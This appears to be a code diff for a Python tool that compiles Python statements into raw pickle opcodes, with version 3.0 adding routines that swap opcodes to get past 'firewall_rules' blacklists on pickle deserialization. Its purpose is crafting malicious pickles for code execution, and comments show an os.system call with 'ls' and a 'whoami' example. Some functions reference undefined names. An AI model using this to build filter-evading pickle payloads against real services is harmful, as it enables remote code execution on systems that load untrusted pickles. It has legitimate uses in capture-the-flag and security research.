@@ -23,105 +23,6 @@ def put_color(string, color, bold=True):
     return f'{Style.BRIGHT if bold else ""}{COLOR}{str(string)}{Style.RESET_ALL}'
 
 
-def format_opcode(code, value=None):
-    def _pure(value):
-        return repr(value.strip())[2:-1] if isinstance(value, bytes) else value.strip()
-
-    def _format(code, value, return_value=False):
-        if code == b"S":
-            return f"S'{value}'\n".encode('utf-8')
-
-        elif code == b"J":
-            # limit: -2147483648 <= value <= 2147483647
-            value = struct.pack('i0i', value)
-
-        if not isinstance(value, bytes):
-            value = b"" if value is None else (str(value).encode('utf-8') + b"\n")
-
-        if return_value:
-            return _pure(value), code + value
-
-        return code + value
-
-    code = code if isinstance(code, list) else [code]
-    if not bypass:
-        # 不需要 bypass
-        return _format(code[0], value)
-
-    pure_code = [_pure(i) for i in code]
-
-    related_rules = {
-        k: v for k, v in firewall_rules.items()
-        if k in pure_code and v in [str(value), "*"]
-    }
-    if not related_rules:
-        # 不需要 bypass
-        return _format(code[0], value)
-
-    if rule_type == 'black':
-        for i, v in enumerate(pure_code):
-            for _c, _v in related_rules.items():
-                if _v == "*":
-                    if _c != v:
-                        # 直接换掉
-                        print(
-                            f"[*] choice {put_color(v, 'blue')} "
-                            # f"instead of {put_color(pure_code[0], 'white')} "
-                            f"to bypass rule: {put_color({_c: _v}, 'white')}"
-                        )
-                        return _format(code[i], value)
-
-                elif _v == str(value):
-                    # 替换 value
-                    try:
-                        new_v, bypassed = _format(
-                            code[i], value, return_value=True)
-                    except struct.error as e:
-                        pass
-
-                    else:
-                        if _v != new_v:
-                            print(
-                                f"[*] choice {put_color(v, 'blue')} "
-                                # f"instead of {put_color(pure_code[0], 'white')} "
-                                f"to bypass rule: {put_color({_c: _v}, 'white')}"
-                            )
-                            return bypassed
-
-        # 均失败
-        raise RuntimeError(
-            f"can NOT bypass: {put_color(related_rules, 'white')}, "
-            f"must use opcode in {put_color(pure_code, 'white')}"
-        )
-
-
-def value_type_map(value):
-    vmap = {
-        int: [b'I', b'J'],
-        float: b'F',
-        str: [b'V', b'S'],
-    }
-    cmap = {
-        None: b'N',
-        True: [b'I01\n', b'\x88'],
-        False: [b'I00\n', b'\x89'],
-    }
-    for _type in vmap:
-        if type(value) is _type:
-            v = vmap[_type]
-            return format_opcode(v, value)
-
-    v = cmap.get(value, None)
-    if v is None:
-        raise RuntimeError(
-            put_color('this basic type is not supported yet :', 'red') +
-            f"{put_color(value, 'cyan')} in {self.code}, "
-            f"type is {put_color(type(value), 'cyan')}"
-        )
-    else:
-        return format_opcode(v)
-
-
 def transfer_funcs(func_name):
     return {
         'base64_encode': __import__('base64').b64encode,
@@ -168,66 +69,223 @@ class Visitor(ast.NodeVisitor):
 
         return pickletools.optimize(b'\n'.join(optimized))
 
-    def _find_var(self, key):
-        loc = self.names.get(key, None)
-        if loc is None:
+    def _flat(self, node):
+        '''递归处理基础的语句
+        '''
+        _types = {
+            ast.Constant: self._parse_constant,
+            ast.List: self._parse_list,
+            ast.Set: self._parse_set,
+            ast.Tuple: self._parse_tuple,
+            ast.Dict: self._parse_dict,
+            ast.Name: self._parse_name,
+            ast.Call: self._parse_call,
+            ast.Attribute: self._parse_attribute,
+            ast.Subscript: self._parse_subscript,
+        }
+
+        for _type in _types:
+            if isinstance(node, _type):
+                return _types[_type](node)
+
+        raise RuntimeError(
+            put_color("this struct is not supported yet: ", "red") +
+            f'{put_color(node.__class__, "cyan")} in {self.code}'
+        )
+
+    def _parse_constant(self, node):
+        def __generate_int():
+            code = ['I', 'J']
+            related_rules = {
+                k: v for k, v in firewall_rules.items()
+                if k in code and v in [str(node.value), "*"]
+            }
+            if not related_rules:
+                return f'{code[0]}{node.value}\n'
+
+            bypass_code = [i for i in code if i not in related_rules]
+            if not bypass_code:
+                raise RuntimeError(
+                    f"can NOT bypass: {put_color(related_rules, 'white')}, "
+                    f"must use opcode in {put_color(code, 'white')}"
+                )
+
+            print(
+                f"[*] choice {put_color(bypass_code[0], 'blue')} "
+                # f"instead of {put_color(pure_code[0], 'white')} "
+                f"to bypass rule: {put_color(related_rules, 'white')}"
+            )
+
+            if bypass_code[0] == 'J':
+                return b"J"+struct.pack('i0i', node.value)
+            else:
+                raise NotImplementedError(
+                    f"{put_color('BUG FOUND', 'red')}, bypass code "
+                    f"{put_color(bypass_code[0], 'white')} is "
+                    'not implemented'
+                )
+
+        def __generate_float():
+            return f'F{node.value}\n'
+
+        def __generate_str():
+            code = ['V', 'S']
+            related_rules = {
+                k: v for k, v in firewall_rules.items()
+                if k in code and v in [str(node.value), "*"]
+            }
+            if not related_rules:
+                return f'{code[0]}{node.value}\n'
+
+            bypass_code = [i for i in code if i not in related_rules]
+            if not bypass_code:
+                raise RuntimeError(
+                    f"can NOT bypass: {put_color(related_rules, 'white')}, "
+                    f"must use opcode in {put_color(code, 'white')}"
+                )
+
+            print(
+                f"[*] choice {put_color(bypass_code[0], 'blue')} "
+                f"to bypass rule: {put_color(related_rules, 'white')}"
+            )
+            if bypass_code[0] == 'S':
+                return f"S'{node.value}'\n"
+            else:
+                raise NotImplementedError(
+                    f"{put_color('BUG FOUND', 'red')}, bypass code "
+                    f"{put_color(bypass_code[0], 'white')} is "
+                    'not implemented'
+                )
+
+        def __generate_none():
+            return f'N'
+
+        def __generate_true():
+            code = ['I01', '\\x88']
+            related_rules = {
+                k: v for k, v in firewall_rules.items()
+                if k in code and v in ["*"]
+            }
+            if not related_rules:
+                return f'{code[0]}\n'
+
+            bypass_code = [i for i in code if i not in related_rules]
+            if not bypass_code:
+                raise RuntimeError(
+                    f"can NOT bypass: {put_color(related_rules, 'white')}, "
+                    f"must use opcode in {put_color(code, 'white')}"
+                )
+
+            print(
+                f"[*] choice {put_color(bypass_code[0], 'blue')} "
+                f"to bypass rule: {put_color(related_rules, 'white')}"
+            )
+            if bypass_code[0] == '\\x88':
+                return b'\x88'
+            else:
+                raise NotImplementedError(
+                    f"{put_color('BUG FOUND', 'red')}, bypass code "
+                    f"{put_color(bypass_code[0], 'white')} is "
+                    'not implemented'
+                )
+            return f'{bypass_code[0]}\n'
+
+        def __generate_false():
+            code = ['I00', '\\x89']
+            related_rules = {
+                k: v for k, v in firewall_rules.items()
+                if k in code and v in ["*"]
+            }
+            if not related_rules:
+                return f'{code[0]}\n'
+
+            bypass_code = [i for i in code if i not in related_rules]
+            if not bypass_code:
+                raise RuntimeError(
+                    f"can NOT bypass: {put_color(related_rules, 'white')}, "
+                    f"must use opcode in {put_color(code, 'white')}"
+                )
+
+            print(
+                f"[*] choice {put_color(bypass_code[0], 'blue')} "
+                f"to bypass rule: {put_color(related_rules, 'white')}"
+            )
+            if bypass_code[0] == '\\x89':
+                return b'\x89'
+            else:
+                raise NotImplementedError(
+                    f"{put_color('BUG FOUND', 'red')}, bypass code "
+                    f"{put_color(bypass_code[0], 'white')} is "
+                    'not implemented'
+                )
+            return f'{bypass_code[0]}\n'
+
+        value_map = {
+            int: __generate_int,
+            float: __generate_float,
+            str: __generate_str,
+
+            None: __generate_none,
+            True: __generate_true,
+            False: __generate_false,
+        }
+        generate_func = (
+            value_map.get(type(node.value), None)
+            or
+            value_map.get(node.value, None)
+        )
+        if generate_func is None:
+            raise RuntimeError(
+                put_color('this basic type is not supported yet: ', 'red') +
+                f"{put_color(node.value, 'cyan')} in {self.code}, "
+                f"type is {put_color(type(node.value), 'cyan')}"
+            )
+
+        result = generate_func()
+        if isinstance(result, str):
+            result = result.encode()
+
+        return result
+
+    def _parse_set(self, node):
+        # PVM Protocol 4
+        return (
+            b'\x8f(' +
+            b"".join([self._flat(elt) for elt in node.elts]) +
+            b'\x90'
+        )
+
+    def _parse_list(self, node):
+        return (
+            b'(' +
+            b"".join([self._flat(elt) for elt in node.elts]) +
+            b'l'
+        )
+
+    def _parse_tuple(self, node):
+        return (
+            b'(' +
+            b"".join([self._flat(elt) for elt in node.elts]) +
+            b't'
+        )
+
+    def _parse_dict(self, node):
+        return (
+            b'(' +
+            b"".join([self._flat(k) + self._flat(v) for k, v in zip(node.keys, node.values)]) +
+            b'd'
+        )
+
+    def _parse_name(self, node):
+        memo_name = self.names.get(node.id, [None, None])[0]
+        if memo_name is None:
             # 说明之前没有定义这个变量
             raise RuntimeError(
                 put_color("this var is not defined: ", "red") +
-                f'{put_color(key, "cyan")} in {self.code}'
-            )
-        else:
-            # g 进来
-            return loc
-
-    def _flat(self, node):
-        if isinstance(node, ast.Constant):
-            return value_type_map(node.value)
-
-        elif isinstance(node, ast.Set):
-            # PVM Protocol 4
-            return (
-                b'\x8f(' +
-                b"".join([self._flat(elt) for elt in node.elts]) +
-                b'\x90'
+                f'{put_color(node.id, "cyan")} in {self.code}'
             )
 
-        elif isinstance(node, ast.List):
-            return (
-                b'(' +
-                b"".join([self._flat(elt) for elt in node.elts]) +
-                b'l'
-            )
-
-        elif isinstance(node, ast.Tuple):
-            return (
-                b'(' +
-                b"".join([self._flat(elt) for elt in node.elts]) +
-                b't'
-            )
-
-        elif isinstance(node, ast.Dict):
-            return (
-                b'(' +
-                b"".join([self._flat(k) + self._flat(v) for k, v in zip(node.keys, node.values)]) +
-                b'd'
-            )
-
-        elif isinstance(node, ast.Name):
-            memo_name = self._find_var(node.id)
-            return f'g{memo_name}\n'.encode('utf-8')
-
-        elif isinstance(node, ast.Call):
-            return self._parse_call(node)
-
-        elif isinstance(node, ast.Subscript):
-            return self._parse_subscript(node)
-
-        else:
-            raise RuntimeError(
-                put_color("this struct is not supported yet: ", "red") +
-                f'{put_color(node.__class__, "cyan")} in {self.code}'
-            )
+        return f'g{memo_name}\n'.encode('utf-8')
 
     def _parse_attribute(self, node):
         targets = node.value
@@ -241,8 +299,6 @@ class Visitor(ast.NodeVisitor):
 
             opcode = self._flat(targets)
             return opcode, attr.encode("utf-8")
-            # module, name = self.import_from.get(name, [None, ]*2)
-            # return f'(N}}V{attr}\n{opcode}\nstb'
         else:
             raise RuntimeError(
                 put_color("this complex dot operators(.) is not supported yet: ", "red") +
@@ -268,31 +324,105 @@ class Visitor(ast.NodeVisitor):
         return outside_opcode, inside_opcode
 
     def _parse_call(self, node):
-        opcode = []
-        while True:
-            opcode.append(
-                b"(" + b"".join([self._flat(arg) for arg in node.args]) + b"tR"
-            )
-            if isinstance(node.func, ast.Name):
-                break
-
-            elif isinstance(node.func, ast.Call):
-                node = node.func
-                continue
+        def _normal_generate(node):
+            if isinstance(node.func, ast.Name) or isinstance(node.func, ast.Call):
+                opcode = (
+                    b"(" + b"".join(
+                        [self._flat(arg) for arg in node.args]
+                    ) + b"tR"
+                )
             else:
                 raise RuntimeError(
                     put_color("this function call is not supported yet: ", "red") +
                     f'{put_color(node.func.__class__, "cyan")} in {self.code}'
                 )
 
-        # 获取函数名
-        # eg: from sys import modules
-        #     a = modules.get("os")
-        func_name = self._flat(node.func)
-        return func_name + b"".join(opcode[::-1])
+            # 获取函数名
+            # eg: from sys import modules
+            #     a = modules.get("os")
+            func_name = self._flat(node.func)
+            return func_name+opcode
+
+        def _obj_generate(node):
+            func_name = self._flat(node.func)
+            if isinstance(node.func, ast.Call) or isinstance(node.func, ast.Name):
+                opcode = (
+                    b"(" + func_name + b"".join(
+                        [self._flat(arg) for arg in node.args]
+                    ) + b"o"
+                )
+            else:
+                raise RuntimeError(
+                    put_color("this function call is not supported yet: ", "red") +
+                    f'{put_color(node.func.__class__, "cyan")} in {self.code}'
+                )
+
+            return opcode
+
+        def _instance_generate(node):
+            # (S'ls'\nios\nsystem\n
+            func_name = self._flat(node.func)
+            code, num = list(func_name.strip().decode())
+
+            imported_func = [
+                (j[1], i)
+                for i, j in self.names.items()
+                if j[0] == num and j[1]
+            ]
+            if code != 'g' or not imported_func:
+                raise RuntimeError(
+                    f"can NOT bypass: {put_color(related_rules, 'white')}, "
+                    f"function must can be import then call: {put_color(self.code, 'white')}"
+                )
+
+            imported_func = imported_func[0]
+            if isinstance(node.func, ast.Name):
+                opcode = (
+                    b"(" + b"".join(
+                        [self._flat(arg) for arg in node.args]
+                    ) + b"i" + ("\n".join(imported_func)).encode() + b"\n"
+                )
+            else:
+                raise RuntimeError(
+                    put_color("this function call is not supported yet: ", "red") +
+                    f'{put_color(node.func.__class__, "cyan")} in {self.code}'
+                )
+
+            return opcode
+
+        code = ['R', 'o', 'i']
+        related_rules = {
+            k: v for k, v in firewall_rules.items()
+            if k in code and v in ["*"]
+        }
+        if not related_rules:
+            return _normal_generate(node)
+
+        bypass_code = [i for i in code if i not in related_rules]
+        if not bypass_code:
+            raise RuntimeError(
+                f"can NOT bypass: {put_color(related_rules, 'white')}, "
+                f"must use opcode in {put_color(code, 'white')}"
+            )
+
+        print(
+            f"[*] choice {put_color(bypass_code[0], 'blue')} "
+            f"to bypass rule: {put_color(related_rules, 'white')}"
+        )
+
+        if bypass_code[0] == 'o':
+            return _obj_generate(node)
+        elif bypass_code[0] == 'i':
+            return _instance_generate(node)
+        else:
+            raise NotImplementedError(
+                f"{put_color('BUG FOUND', 'red')}, bypass code "
+                f"{put_color(bypass_code[0], 'white')} is "
+                'not implemented'
+            )
 
     def visit_Import(self, node):
-        # DO NOT USE iT!
+        # MUST raise an Error
         # eg: import os
         self.code = put_color("\n".join(
             source_code.split('\n')
@@ -318,7 +448,7 @@ class Visitor(ast.NodeVisitor):
         def _generate_opcode():
             for _name in node.names:
                 name = _name.asname or _name.name
-                self.names[name] = str(self.memo_id)
+                self.names[name] = [str(self.memo_id), node.module]
                 self.final_opcode += f'c{node.module}\n{name}\np{self.memo_id}\n'.encode('utf-8')
                 self.memo_id += 1
 
@@ -327,7 +457,6 @@ class Visitor(ast.NodeVisitor):
     def visit_Assign(self, node):
         # 赋值
         # a = "whoami"
-
         def _generate_opcode():
             if isinstance(node.targets[0], ast.Tuple):
                 raise RuntimeError(
@@ -342,7 +471,7 @@ class Visitor(ast.NodeVisitor):
                 assign_opcode = b'{right_opcode}p{self.memo_id}\n' \
                                 .replace(b'{self.memo_id}', str(self.memo_id).encode("utf-8"))
 
-                self.names[name] = str(self.memo_id)
+                self.names[name] = [str(self.memo_id), None]
                 self.memo_id += 1
 
             elif isinstance(node.targets[0], ast.Attribute):
@@ -395,7 +524,7 @@ class Visitor(ast.NodeVisitor):
 
 
 Init()
-VERSION = '2.1'
+VERSION = '3.0'
 FUNC_NAME = {
     "b64": "base64_encode",
     "base64": "base64_encode",
